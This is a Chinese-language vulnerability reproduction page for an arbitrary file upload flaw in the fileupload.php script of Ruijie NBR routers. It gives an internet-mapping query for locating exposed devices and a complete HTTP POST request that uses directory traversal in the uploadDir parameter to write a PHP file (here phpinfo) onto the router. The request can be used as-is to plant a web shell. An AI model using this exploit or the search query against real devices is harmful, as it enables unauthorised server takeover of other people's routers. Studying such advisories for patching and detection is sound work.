# 锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞

## 漏洞描述

锐捷 NBR 路由器 fileupload.php文件存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器获取服务器权限

## 漏洞影响

<a-checkbox checked>锐捷 NBR 路由器</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="Ruijie-NBR路由器"</a-checkbox></br>

## 漏洞复现

![img](../../../.vuepress/public/img/1647768741978-90d9f47d-e003-4565-9153-9ccd7fbda5cc.png)

出现漏洞的文件在 /ddi/server/fileupload.php， 该文件为标准的文件上传文件

![img](../../../.vuepress/public/img/1647768806049-76ae4f06-3df1-43cc-9154-2dfffafddcaf.png)

文件名及目录均可控，导致可以任意上传文件

```php
POST /ddi/server/fileupload.php?uploadDir=../../321&name=123.php HTTP/1.1
Host: 
Accept: text/plain, */*; q=0.01
Content-Disposition: form-data; name="file"; filename="111.php"
Content-Type: image/jpeg

<?php phpinfo();?>
```

![img](../../../.vuepress/public/img/1647768840891-cb2de5f0-98bb-40e0-9b9e-bcf348864f85.png)

访问上传的文件目录

![img](../../../.vuepress/public/img/1647768865012-128cd155-75d0-4e94-a1fc-dbed5df6f8dc.png)